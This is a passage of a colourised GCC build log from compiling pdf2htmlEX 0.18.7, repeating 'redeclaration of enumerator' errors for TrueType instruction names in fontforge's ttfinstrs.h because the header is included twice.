In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:43:44:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_nround[m[K’
  ttf_neg=0x65, ttf_neq=0x55, ttf_not=0x5c, [01;31m[Kttf_nround[m[K=0x6c, ttf_odd=0x56,
                                            [01;31m[K^~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:43:44:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_nround[m[K’ was here
  ttf_neg=0x65, ttf_neq=0x55, ttf_not=0x5c, [01;36m[Kttf_nround[m[K=0x6c, ttf_odd=0x56,
                                            [01;36m[K^~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:43:61:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_odd[m[K’
  ttf_neg=0x65, ttf_neq=0x55, ttf_not=0x5c, ttf_nround=0x6c, [01;31m[Kttf_odd[m[K=0x56,
                                                             [01;31m[K^~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:43:61:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_odd[m[K’ was here
  ttf_neg=0x65, ttf_neq=0x55, ttf_not=0x5c, ttf_nround=0x6c, [01;36m[Kttf_odd[m[K=0x56,
                                                             [01;36m[K^~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:44:2:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_or[m[K’
  [01;31m[Kttf_or[m[K=0x5b, ttf_pop=0x21, ttf_rcvt=0x45, ttf_rdtg=0x7d, ttf_roff=0x7a,
  [01;31m[K^~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:44:2:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_or[m[K’ was here
  [01;36m[Kttf_or[m[K=0x5b, ttf_pop=0x21, ttf_rcvt=0x45, ttf_rdtg=0x7d, ttf_roff=0x7a,
  [01;36m[K^~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:44:15:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_pop[m[K’
  ttf_or=0x5b, [01;31m[Kttf_pop[m[K=0x21, ttf_rcvt=0x45, ttf_rdtg=0x7d, ttf_roff=0x7a,
               [01;31m[K^~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:44:15:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_pop[m[K’ was here
  ttf_or=0x5b, [01;36m[Kttf_pop[m[K=0x21, ttf_rcvt=0x45, ttf_rdtg=0x7d, ttf_roff=0x7a,
               [01;36m[K^~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:44:29:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_rcvt[m[K’
  ttf_or=0x5b, ttf_pop=0x21, [01;31m[Kttf_rcvt[m[K=0x45, ttf_rdtg=0x7d, ttf_roff=0x7a,
                             [01;31m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:44:29:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_rcvt[m[K’ was here
  ttf_or=0x5b, ttf_pop=0x21, [01;36m[Kttf_rcvt[m[K=0x45, ttf_rdtg=0x7d, ttf_roff=0x7a,
                             [01;36m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:44:44:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_rdtg[m[K’
  ttf_or=0x5b, ttf_pop=0x21, ttf_rcvt=0x45, [01;31m[Kttf_rdtg[m[K=0x7d, ttf_roff=0x7a,
                                            [01;31m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:44:44:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_rdtg[m[K’ was here
  ttf_or=0x5b, ttf_pop=0x21, ttf_rcvt=0x45, [01;36m[Kttf_rdtg[m[K=0x7d, ttf_roff=0x7a,
                                            [01;36m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:44:59:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_roff[m[K’
  ttf_or=0x5b, ttf_pop=0x21, ttf_rcvt=0x45, ttf_rdtg=0x7d, [01;31m[Kttf_roff[m[K=0x7a,
                                                           [01;31m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:44:59:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_roff[m[K’ was here
  ttf_or=0x5b, ttf_pop=0x21, ttf_rcvt=0x45, ttf_rdtg=0x7d, [01;36m[Kttf_roff[m[K=0x7a,
                                                           [01;36m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:45:2:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_roll[m[K’
  [01;31m[Kttf_roll[m[K=0x8a, ttf_round=0x68, ttf_rs=0x43, ttf_rtdg=0x3d, ttf_rtg=0x18,
  [01;31m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:45:2:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_roll[m[K’ was here
  [01;36m[Kttf_roll[m[K=0x8a, ttf_round=0x68, ttf_rs=0x43, ttf_rtdg=0x3d, ttf_rtg=0x18,
  [01;36m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:45:17:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_round[m[K’
  ttf_roll=0x8a, [01;31m[Kttf_round[m[K=0x68, ttf_rs=0x43, ttf_rtdg=0x3d, ttf_rtg=0x18,
                 [01;31m[K^~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:45:17:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_round[m[K’ was here
  ttf_roll=0x8a, [01;36m[Kttf_round[m[K=0x68, ttf_rs=0x43, ttf_rtdg=0x3d, ttf_rtg=0x18,
                 [01;36m[K^~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:45:33:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_rs[m[K’
  ttf_roll=0x8a, ttf_round=0x68, [01;31m[Kttf_rs[m[K=0x43, ttf_rtdg=0x3d, ttf_rtg=0x18,
                                 [01;31m[K^~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:45:33:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_rs[m[K’ was here
  ttf_roll=0x8a, ttf_round=0x68, [01;36m[Kttf_rs[m[K=0x43, ttf_rtdg=0x3d, ttf_rtg=0x18,
                                 [01;36m[K^~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:45:46:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_rtdg[m[K’
  ttf_roll=0x8a, ttf_round=0x68, ttf_rs=0x43, [01;31m[Kttf_rtdg[m[K=0x3d, ttf_rtg=0x18,
                                              [01;31m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:45:46:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_rtdg[m[K’ was here
  ttf_roll=0x8a, ttf_round=0x68, ttf_rs=0x43, [01;36m[Kttf_rtdg[m[K=0x3d, ttf_rtg=0x18,
                                              [01;36m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:45:61:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_rtg[m[K’
  ttf_roll=0x8a, ttf_round=0x68, ttf_rs=0x43, ttf_rtdg=0x3d, [01;31m[Kttf_rtg[m[K=0x18,
                                                             [01;31m[K^~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:45:61:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_rtg[m[K’ was here
  ttf_roll=0x8a, ttf_round=0x68, ttf_rs=0x43, ttf_rtdg=0x3d, [01;36m[Kttf_rtg[m[K=0x18,
                                                             [01;36m[K^~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:46:2:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_rthg[m[K’
  [01;31m[Kttf_rthg[m[K=0x19, ttf_rutg=0x7c, ttf_s45round=0x77, ttf_sangw=0x7e,
  [01;31m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:46:2:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_rthg[m[K’ was here
  [01;36m[Kttf_rthg[m[K=0x19, ttf_rutg=0x7c, ttf_s45round=0x77, ttf_sangw=0x7e,
  [01;36m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:46:17:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_rutg[m[K’
  ttf_rthg=0x19, [01;31m[Kttf_rutg[m[K=0x7c, ttf_s45round=0x77, ttf_sangw=0x7e,
                 [01;31m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:46:17:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_rutg[m[K’ was here
  ttf_rthg=0x19, [01;36m[Kttf_rutg[m[K=0x7c, ttf_s45round=0x77, ttf_sangw=0x7e,
                 [01;36m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:46:32:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_s45round[m[K’
  ttf_rthg=0x19, ttf_rutg=0x7c, [01;31m[Kttf_s45round[m[K=0x77, ttf_sangw=0x7e,
                                [01;31m[K^~~~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:46:32:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_s45round[m[K’ was here
  ttf_rthg=0x19, ttf_rutg=0x7c, [01;36m[Kttf_s45round[m[K=0x77, ttf_sangw=0x7e,
                                [01;36m[K^~~~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:46:51:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_sangw[m[K’
  ttf_rthg=0x19, ttf_rutg=0x7c, ttf_s45round=0x77, [01;31m[Kttf_sangw[m[K=0x7e,
                                                   [01;31m[K^~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:46:51:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_sangw[m[K’ was here
  ttf_rthg=0x19, ttf_rutg=0x7c, ttf_s45round=0x77, [01;36m[Kttf_sangw[m[K=0x7e,
                                                   [01;36m[K^~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:47:2:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_scanctrl[m[K’
  [01;31m[Kttf_scanctrl[m[K=0x85, ttf_scantype=0x8d, ttf_scfs=0x48, ttf_scvtci=0x1d,
  [01;31m[K^~~~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:47:2:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_scanctrl[m[K’ was here
  [01;36m[Kttf_scanctrl[m[K=0x85, ttf_scantype=0x8d, ttf_scfs=0x48, ttf_scvtci=0x1d,
  [01;36m[K^~~~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:47:21:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_scantype[m[K’
  ttf_scanctrl=0x85, [01;31m[Kttf_scantype[m[K=0x8d, ttf_scfs=0x48, ttf_scvtci=0x1d,
                     [01;31m[K^~~~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:47:21:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_scantype[m[K’ was here
  ttf_scanctrl=0x85, [01;36m[Kttf_scantype[m[K=0x8d, ttf_scfs=0x48, ttf_scvtci=0x1d,
                     [01;36m[K^~~~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:47:40:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_scfs[m[K’
  ttf_scanctrl=0x85, ttf_scantype=0x8d, [01;31m[Kttf_scfs[m[K=0x48, ttf_scvtci=0x1d,
                                        [01;31m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:47:40:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_scfs[m[K’ was here
  ttf_scanctrl=0x85, ttf_scantype=0x8d, [01;36m[Kttf_scfs[m[K=0x48, ttf_scvtci=0x1d,
                                        [01;36m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:47:55:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_scvtci[m[K’
  ttf_scanctrl=0x85, ttf_scantype=0x8d, ttf_scfs=0x48, [01;31m[Kttf_scvtci[m[K=0x1d,
                                                       [01;31m[K^~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:47:55:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_scvtci[m[K’ was here
  ttf_scanctrl=0x85, ttf_scantype=0x8d, ttf_scfs=0x48, [01;36m[Kttf_scvtci[m[K=0x1d,
                                                       [01;36m[K^~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:48:2:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_sdb[m[K’
  [01;31m[Kttf_sdb[m[K=0x5e, ttf_sdpvtl=0x86, ttf_sds=0x5f, ttf_sfvfs=0x0b, ttf_sfvtca=0x04,
  [01;31m[K^~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:48:2:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_sdb[m[K’ was here
  [01;36m[Kttf_sdb[m[K=0x5e, ttf_sdpvtl=0x86, ttf_sds=0x5f, ttf_sfvfs=0x0b, ttf_sfvtca=0x04,
  [01;36m[K^~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:48:16:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_sdpvtl[m[K’
  ttf_sdb=0x5e, [01;31m[Kttf_sdpvtl[m[K=0x86, ttf_sds=0x5f, ttf_sfvfs=0x0b, ttf_sfvtca=0x04,
                [01;31m[K^~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:48:16:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_sdpvtl[m[K’ was here
